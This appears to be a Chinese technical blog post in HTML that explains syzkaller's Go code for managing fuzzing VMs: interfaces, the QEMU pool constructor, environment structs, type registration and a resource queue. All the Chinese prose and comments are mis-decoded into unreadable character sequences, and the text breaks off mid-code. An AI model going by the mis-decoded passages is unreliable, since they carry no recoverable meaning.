SIGABORT&#x27;ing ä¸€ä¸ª Go ç¨‹åº).</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// é€‰æ‹©æ€§åœ°ç›´æ¥è¿”å› (ä¸€äº›æˆ–æ‰€æœ‰) ä¿¡æ¯. è‹¥ wait == true,</span><br><span class="hljs-comment">// è°ƒç”¨è€…å¿…é¡»ç­‰å¾… VM ç›´æ¥è¾“å‡ºä¿¡æ¯åˆ°å…¶æ—¥å¿—.</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// rep æè¿°äº† Diagnose è¢«è°ƒç”¨çš„åŸå› .</span><br>Diagnose(rep *report.Report) (diagnosis []<span class="hljs-type">byte</span>, wait <span class="hljs-type">bool</span>)<br><br><span class="hljs-comment">// Close åœæ­¢å¹¶é”€æ¯ VM.</span><br>Close()<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>Copy()</code>ï¼šå°†ä¸€ä¸ªæ¥è‡ªå®¿ä¸»æœºçš„æ–‡ä»¶æ‹·è´è‡³è™šæ‹Ÿæœºä¸­ï¼Œè¿”å›è™šæ‹Ÿæœºä¸­çš„æ–‡ä»¶å.</li><li><code>Forward()</code>ï¼šè®¾ç½®ä»è™šæ‹Ÿæœºå†…åˆ°ä¸»æœºä¸Šç»™å®š tcp ç«¯å£çš„è½¬å‘ï¼Œå¹¶è¿”å›è¦åœ¨è™šæ‹Ÿæœºä¸­ä½¿ç”¨çš„åœ°å€</li><li><code>Run()</code>ï¼šåœ¨è™šæ‹Ÿæœºå†…æ‰§è¡Œå‘½ä»¤</li><li><code>Diagnose()</code>ï¼šåœ¨è™šæ‹Ÿæœºä¸Šæ£€ç´¢é¢å¤–çš„è°ƒè¯•ä¿¡æ¯</li><li><code>Close()</code>ï¼šåœæ­¢å¹¶é”€æ¯è™šæ‹Ÿæœº</li></ul><p>éœ€è¦æ³¨æ„çš„æ˜¯<strong>ä¸åŒç±»å‹çš„ Guest VM æ‰€å®ç°çš„ Interface æ¥å£æ˜¯ä¸åŒçš„</strong></p><blockquote><p>ä»¥ QEMU ä¸ºä¾‹ï¼Œå…¶å®ç°ä¸»è¦ä½äº <code>vm/qemu/qemu.go</code> ä¸­</p></blockquote><h3 id="2-Poolï¼šVM-æ± "><a href="#2-Poolï¼šVM-æ± " class="headerlink" title="2.Poolï¼šVM æ± "></a>2.Poolï¼šVM æ± </h3><p>ç±»ä¼¼äºçº¿ç¨‹æ± çš„æ¦‚å¿µï¼Œåœ¨ <code>syz-manager</code> ä¸­ä½¿ç”¨ä¸€ä¸ª <strong>VM æ± </strong> â€”â€” <code>Pool</code> ç»“æ„ä½“æ¥ç®¡æ§ Guest VMï¼Œè¯¥ç»“æ„ä½“å®šä¹‰äº <code>vm/vm.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Pool <span class="hljs-keyword">struct</span> &#123;<br>impl        vmimpl.Pool<br>workdir     <span class="hljs-type">string</span><br>template    <span class="hljs-type">string</span><br>timeouts    targets.Timeouts<br>activeCount <span class="hljs-type">int32</span><br>&#125;<br></code></pre></td></tr></table></figure><p>è¯¥ç»“æ„ä½“å®ç°äº† <code>Pool</code> æ¥å£ï¼Œå®šä¹‰äº <code>vm/vmimpl/vmimpl.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Pool è¡¨ç¤ºäº†ä¸€ç»„ç‰¹å®šç±»å‹çš„æµ‹è¯•æœºå™¨ (è™šæ‹Ÿæœº, ç‰©ç†è®¾å¤‡, etc).</span><br><span class="hljs-keyword">type</span> Pool <span class="hljs-keyword">interface</span> &#123;<br><span class="hljs-comment">// Count è¿”å›æ± ä¸­æ‰€æœ‰ VM çš„æ•°é‡.</span><br>Count() <span class="hljs-type">int</span><br><br><span class="hljs-comment">// Create åˆ›å»ºå¹¶å¯åŠ¨ä¸€ä¸ªæ–°çš„ VM å®ä¾‹.</span><br>Create(workdir <span class="hljs-type">string</span>, index <span class="hljs-type">int</span>) (Instance, <span class="hljs-type">error</span>)<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>Count()</code>ï¼šè¿”å›æ± ä¸­æ‰€æœ‰ VM çš„æ•°é‡</li><li><code>Create()</code>ï¼š<strong>æ–°å»ºå¹¶å¯åŠ¨ä¸€ä¸ª VMå®ä¾‹</strong>ï¼Œè¿”å›æ–°å»ºçš„å®ä¾‹å¯¹è±¡</li></ul><h4 id="QEMU-VM-æµ…æ"><a href="#QEMU-VM-æµ…æ" class="headerlink" title="QEMU VM æµ…æ"></a>QEMU VM æµ…æ</h4><p>ä»¥ QEMU ä¸ºä¾‹çš„ Pool æ¥å£å®ç°å¦‚ä¸‹ï¼Œå¯¹äº <code>Count()</code> è€Œè¨€ä¼šç›´æ¥è¿”å›é…ç½®æ–‡ä»¶ä¸­çš„è®¡æ•°ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *Pool)</span></span> Count() <span class="hljs-type">int</span> &#123;<br><span class="hljs-keyword">return</span> pool.cfg.Count<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Create()</code> åˆ™ä¼šé¦–å…ˆæ£€æŸ¥æ–‡ä»¶ç³»ç»Ÿé•œåƒæ˜¯å¦ä¸º <code>9p</code> æ ¼å¼ï¼Œè‹¥æ˜¯åˆ™ä¼šç”Ÿæˆä¸€ä¸ª ssh key å­˜æ”¾åˆ° <code>key</code> æ–‡ä»¶ä¸­å¹¶ç”Ÿæˆä¸€ä¸ª <code>init.sh</code> æ–‡ä»¶ï¼›æ¥ä¸‹æ¥å°±æ˜¯è°ƒç”¨ <code>ctor()</code> å‡½æ•°åˆ›å»ºè™šæ‹Ÿæœºï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *Pool)</span></span> Create(workdir <span class="hljs-type">string</span>, index <span class="hljs-type">int</span>) (vmimpl.Instance, <span class="hljs-type">error</span>) &#123;<br>sshkey := pool.env.SSHKey<br>sshuser := pool.env.SSHUser<br><span class="hljs-keyword">if</span> pool.env.Image == <span class="hljs-string">&quot;9p&quot;</span> &#123;<br>sshkey = filepath.Join(workdir, <span class="hljs-string">&quot;key&quot;</span>)<br>sshuser = <span class="hljs-string">&quot;root&quot;</span><br><span class="hljs-keyword">if</span> _, err := osutil.RunCmd(<span class="hljs-number">10</span>*time.Minute, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;ssh-keygen&quot;</span>, <span class="hljs-string">&quot;-t&quot;</span>, <span class="hljs-string">&quot;rsa&quot;</span>, <span class="hljs-string">&quot;-b&quot;</span>, <span class="hljs-string">&quot;2048&quot;</span>,<br><span class="hljs-string">&quot;-N&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;-C&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;-f&quot;</span>, sshkey); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>initFile := filepath.Join(workdir, <span class="hljs-string">&quot;init.sh&quot;</span>)<br><span class="hljs-keyword">if</span> err := osutil.WriteExecFile(initFile, []<span class="hljs-type">byte</span>(strings.Replace(initScript, <span class="hljs-string">&quot;&#123;&#123;KEY&#125;&#125;&quot;</span>, sshkey, <span class="hljs-number">-1</span>))); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create init file: %v&quot;</span>, err)<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; ; i++ &#123;<br>inst, err := pool.ctor(workdir, sshkey, sshuser, index)<br><span class="hljs-keyword">if</span> err == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> inst, <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-comment">// Older qemu prints &quot;could&quot;, newer -- &quot;Could&quot;.</span><br><span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">1000</span> &amp;&amp; strings.Contains(err.Error(), <span class="hljs-string">&quot;ould not set up host forwarding rule&quot;</span>) &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">1000</span> &amp;&amp; strings.Contains(err.Error(), <span class="hljs-string">&quot;Device or resource busy&quot;</span>) &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><code>ctor()</code> çš„å®ç°æ¯”è¾ƒç®€å•ï¼Œä¸»è¦å°±æ˜¯åˆ›å»ºä¸€ä¸ªå¸¦ç€ ssh key åŠä¸€äº›é…ç½®ä¿¡æ¯ä¸ä¸€ä¸ª channel çš„ <code>instance</code> å®ä¾‹ï¼Œåˆå§‹åŒ–å®ä¾‹å†…çš„ç®¡é“å¹¶è°ƒç”¨ <code>boot()</code> å‡½æ•°è¿›è¡Œæ­£å¼çš„åˆ›å»ºï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *Pool)</span></span> ctor(workdir, sshkey, sshuser <span class="hljs-type">string</span>, index <span class="hljs-type">int</span>) (vmimpl.Instance, <span class="hljs-type">error</span>) &#123;<br>inst := &amp;instance&#123;<br>index:      index,<br>cfg:        pool.cfg,<br>target:     pool.target,<br>archConfig: pool.archConfig,<br>version:    pool.version,<br>image:      pool.env.Image,<br>debug:      pool.env.Debug,<br>os:         pool.env.OS,<br>timeouts:   pool.env.Timeouts,<br>workdir:    workdir,<br>sshkey:     sshkey,<br>sshuser:    sshuser,<br>diagnose:   <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>, <span class="hljs-number">1</span>),<br>&#125;<br><span class="hljs-keyword">if</span> st, err := os.Stat(inst.image); err != <span class="hljs-literal">nil</span> &amp;&amp; st.Size() == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Some kernels may not need an image, however caller may still</span><br><span class="hljs-comment">// want to pass us a fake empty image because the rest of syzkaller</span><br><span class="hljs-comment">// assumes that an image is mandatory. So if the image is empty, we ignore it.</span><br>inst.image = <span class="hljs-string">&quot;&quot;</span><br>&#125;<br>closeInst := inst<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> closeInst != <span class="hljs-literal">nil</span> &#123;<br>closeInst.Close()<br>&#125;<br>&#125;()<br><br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>inst.rpipe, inst.wpipe, err = osutil.LongPipe()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br><span class="hljs-keyword">if</span> err := inst.boot(); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><br>closeInst = <span class="hljs-literal">nil</span><br><span class="hljs-keyword">return</span> inst, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>boot()</code> å‡½æ•°ä¸»è¦å°±æ˜¯å„ç§å‚æ•°åˆ¤æ–­ï¼Œä¹‹å<strong>æŠŠ QEMU èµ·äº†ä»¥å ssh è¿ä¸Šå»</strong>ï¼Œè¿™é‡Œå°±ä¸æ‘˜æŠ„ä»£ç äº†ï¼šï¼‰</p><h3 id="3-Envï¼šå•ä¸ª-VM-Pool-çš„ç¯å¢ƒå˜é‡"><a href="#3-Envï¼šå•ä¸ª-VM-Pool-çš„ç¯å¢ƒå˜é‡" class="headerlink" title="3. Envï¼šå•ä¸ª  VM Pool çš„ç¯å¢ƒå˜é‡"></a>3. Envï¼šå•ä¸ª  VM Pool çš„ç¯å¢ƒå˜é‡</h3><p><code>Env</code> ç»“æ„ä½“ä¸ºç”¨äºä¸€ä¸ª VM Pool çš„ç¯å¢ƒå˜é‡ï¼Œå®šä¹‰äº <code>vm/vmimpl/vmimpl.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Env åŒ…å«äº†ç”¨äº VM æ± çš„å…¨å±€å¸¸é‡å‚æ•°.</span><br><span class="hljs-keyword">type</span> Env <span class="hljs-keyword">struct</span> &#123;<br><span class="hljs-comment">// ç‹¬ç‰¹çš„åå­—</span><br><span class="hljs-comment">// è‹¥å‡ ä¸ª Pool å…±äº«äº†å…¨å±€å‘½åç©ºé—´åˆ™å¯è¢«ç”¨äº VM name çš„å†²çªè§£å†³</span><br>Name      <span class="hljs-type">string</span><br>OS        <span class="hljs-type">string</span> <span class="hljs-comment">// ç›®æ ‡ OS</span><br>Arch      <span class="hljs-type">string</span> <span class="hljs-comment">// ç›®æ ‡ arch</span><br>Workdir   <span class="hljs-type">string</span><br>Image     <span class="hljs-type">string</span><br>SSHKey    <span class="hljs-type">string</span><br>SSHUser   <span class="hljs-type">string</span><br>Timeouts  targets.Timeouts<br>Debug     <span class="hljs-type">bool</span><br>Config    []<span class="hljs-type">byte</span> <span class="hljs-comment">// json-åºåˆ—åŒ–çš„ VM-ç±»å‹-ç‰¹å®šé…ç½®</span><br>KernelSrc <span class="hljs-type">string</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-Typeï¼šVM-ç±»å‹"><a href="#4-Typeï¼šVM-ç±»å‹" class="headerlink" title="4. Typeï¼šVM ç±»å‹"></a>4. Typeï¼šVM ç±»å‹</h3><p>ä¸€ä¸ª VM Pool ä¸­åªèƒ½æœ‰ä¸€ç§ç±»å‹çš„ VMï¼Œå› è€Œä¸åŒç±»å‹çš„ VM çš„ Pool åº”å½“è¦æœ‰ä¸åŒçš„æ„é€ å‡½æ•°ï¼Œåœ¨ <code>syz-manager</code> ä¸­ä½¿ç”¨ <code>Type</code> ç»“æ„ä½“è¡¨ç¤ºä¸€ç§ VM çš„ç±»å‹ä¿¡æ¯ï¼Œå®šä¹‰äº <code>vm/vmimpl/vmimpl.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Type <span class="hljs-keyword">struct</span> &#123;<br>Ctor       ctorFunc<br>Overcommit <span class="hljs-type">bool</span><br>&#125;<br><br><span class="hljs-keyword">type</span> ctorFunc <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(env *Env)</span></span> (Pool, <span class="hljs-type">error</span>)<br></code></pre></td></tr></table></figure><p><code>ctorFunc</code> ä¸ºæ„é€ å‡½æ•°ç±»å‹ï¼Œå…¶æ¥å—ä¸€ä¸ª <code>Env</code> ç±»å‹çš„ç»“æ„ä½“æŒ‡é’ˆï¼ˆå‚¨å­˜äº†å…¨å±€çš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ï¼‰ï¼Œå¹¶è¿”å›ä¸€ä¸ª VM Pool å®ä¾‹</p><p>ç”±ä¸€ä¸ªå…¨å±€çš„ <code>stringâ†’Type</code> æ˜ å°„è¡¨å­˜å‚¨äº†ä¸åŒç±»å‹ VM çš„ä¿¡æ¯ï¼Œåœ¨æ­£å¼å¯åŠ¨ä¹‹å‰ç¨‹åºä¼šé€šè¿‡ <code>Register()</code> å‡½æ•°å°†ä¸åŒç±»å‹çš„ VM ä¿¡æ¯æ³¨å†Œåˆ°è¯¥è¡¨ä¸­ï¼Œå®šä¹‰äº <code>vm/vmimpl/vmimpl.go</code> ä¸­ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Register åœ¨åŒ…ä¸­æ³¨å†Œä¸€ä¸ªæ–°çš„ VM ç±»å‹.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Register</span><span class="hljs-params">(typ <span class="hljs-type">string</span>, ctor ctorFunc, allowsOvercommit <span class="hljs-type">bool</span>)</span></span> &#123;<br>Types[typ] = Type&#123;<br>Ctor:       ctor,<br>Overcommit: allowsOvercommit,<br>&#125;<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">var</span>(<br>    <span class="hljs-comment">//...</span><br>Types = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]Type)<br></code></pre></td></tr></table></figure><p>ä»¥ <code>QEMU</code> ä¸ºä¾‹ï¼Œå…¶åœ¨åŒ…è¢«å¯¼å…¥æ—¶æ³¨å†Œæ„é€ å‡½æ•°ï¼Œä¸»è¦æ˜¯è°ƒç”¨ <code>LoadData()</code> è§£æé…ç½®æ–‡ä»¶åè¿›è¡Œæ£€æŸ¥ï¼Œè¿™é‡Œä¸å†èµ˜å™ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> _ vmimpl.Infoer = (*instance)(<span class="hljs-literal">nil</span>)<br>vmimpl.Register(<span class="hljs-string">&quot;qemu&quot;</span>, ctor, <span class="hljs-literal">true</span>)<br>&#125;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ctor</span><span class="hljs-params">(env *vmimpl.Env)</span></span> (vmimpl.Pool, <span class="hljs-type">error</span>) &#123;<br>archConfig := archConfigs[env.OS+<span class="hljs-string">&quot;/&quot;</span>+env.Arch]<br>cfg := &amp;Config&#123;<br>Count:       <span class="hljs-number">1</span>,<br>CPU:         <span class="hljs-number">1</span>,<br>Mem:         <span class="hljs-number">1024</span>,<br>ImageDevice: <span class="hljs-string">&quot;hda&quot;</span>,<br>Qemu:        archConfig.Qemu,<br>QemuArgs:    archConfig.QemuArgs,<br>NetDev:      archConfig.NetDev,<br>Snapshot:    <span class="hljs-literal">true</span>,<br>&#125;<br><span class="hljs-keyword">if</span> err := config.LoadData(env.Config, cfg); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to parse qemu vm config: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">if</span> cfg.Count &lt; <span class="hljs-number">1</span> || cfg.Count &gt; <span class="hljs-number">128</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;invalid config param count: %v, want [1, 128]&quot;</span>, cfg.Count)<br>&#125;<br><span class="hljs-keyword">if</span> env.Debug &amp;&amp; cfg.Count &gt; <span class="hljs-number">1</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;limiting number of VMs from %v to 1 in debug mode&quot;</span>, cfg.Count)<br>cfg.Count = <span class="hljs-number">1</span><br>&#125;<br><span class="hljs-keyword">if</span> _, err := exec.LookPath(cfg.Qemu); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br><span class="hljs-keyword">if</span> env.Image == <span class="hljs-string">&quot;9p&quot;</span> &#123;<br><span class="hljs-keyword">if</span> env.OS != targets.Linux &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;9p image is supported for linux only&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> cfg.Kernel == <span class="hljs-string">&quot;&quot;</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;9p image requires kernel&quot;</span>)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> !osutil.IsExist(env.Image) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;image file &#x27;%v&#x27; does not exist&quot;</span>, env.Image)<br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> cfg.CPU &lt;= <span class="hljs-number">0</span> || cfg.CPU &gt; <span class="hljs-number">1024</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;bad qemu cpu: %v, want [1-1024]&quot;</span>, cfg.CPU)<br>&#125;<br><span class="hljs-keyword">if</span> cfg.Mem &lt; <span class="hljs-number">128</span> || cfg.Mem &gt; <span class="hljs-number">1048576</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;bad qemu mem: %v, want [128-1048576]&quot;</span>, cfg.Mem)<br>&#125;<br>cfg.Kernel = osutil.Abs(cfg.Kernel)<br>cfg.Initrd = osutil.Abs(cfg.Initrd)<br><br>output, err := osutil.RunCmd(time.Minute, <span class="hljs-string">&quot;&quot;</span>, cfg.Qemu, <span class="hljs-string">&quot;--version&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>version := <span class="hljs-type">string</span>(bytes.Split(output, []<span class="hljs-type">byte</span>&#123;<span class="hljs-string">&#x27;\n&#x27;</span>&#125;)[<span class="hljs-number">0</span>])<br><br>pool := &amp;Pool&#123;<br>env:        env,<br>cfg:        cfg,<br>version:    version,<br>target:     targets.Get(env.OS, env.Arch),<br>archConfig: archConfig,<br>&#125;<br><span class="hljs-keyword">return</span> pool, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-ResourcePoolï¼šVM-èµ„æºæ± é˜Ÿåˆ—"><a href="#5-ResourcePoolï¼šVM-èµ„æºæ± é˜Ÿåˆ—" class="headerlink" title="5. ResourcePoolï¼šVM èµ„æºæ± é˜Ÿåˆ—"></a>5. ResourcePoolï¼šVM èµ„æºæ± é˜Ÿåˆ—</h3><p>Guest VM çš„èµ„æºè°ƒé…ä¸»è¦æ˜¯é€šè¿‡<code>ResourcePool</code> è¿™ä¸€ç»“æ„æ¥å®Œæˆçš„ï¼Œè¿™å®é™…ä¸Šæ˜¯ä¸€ä¸ª <strong>å­˜æ”¾ç©ºé—² VM ã® idx çš„å•å‘é˜Ÿåˆ—ï¼Œå†³å®šäº† VM çš„è°ƒåº¦é¡ºåº</strong>ï¼š</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> ResourcePool <span class="hljs-keyword">struct</span> &#123;<br>ids   []<span class="hljs-type">int</span><br>mu    sync.RWMutex<br>Freed <span class="hljs-keyword">chan</span> <span class="hljs-keyword">interface</span>&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä¸»è¦å®šä¹‰äº†è¿™äº›æ–¹æ³•æ¥æ“çºµèµ„æºæ± é˜Ÿåˆ—ï¼š</p><ul><li><code>Put()</code> ï¼šå‘é˜Ÿåˆ—æœ«å°¾æ·»åŠ ç©ºé—² VM ã® idx</li><li><code>Len()</code> ï¼šè·å–é˜Ÿåˆ—é•¿åº¦</li><li><code>Take()</code>ï¼šä»é˜Ÿåˆ—é¦–éƒ¨å–å‡º <code>cnt</code> ä¸ªæˆå‘˜</li><li><code>TakeOne()</code> ï¼šä»é˜Ÿåˆ—é¦–éƒ¨å–å‡ºå•ä¸ªæˆå‘˜</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(pool *ResourcePool)</span></span> Put(ids ...<span class="hljs-type">int</span>) &#123;<br>pool.mu.Lock()<br><span class="hljs-keyword">defer</span> pool.mu.Unlock()<br>pool.ids = <span 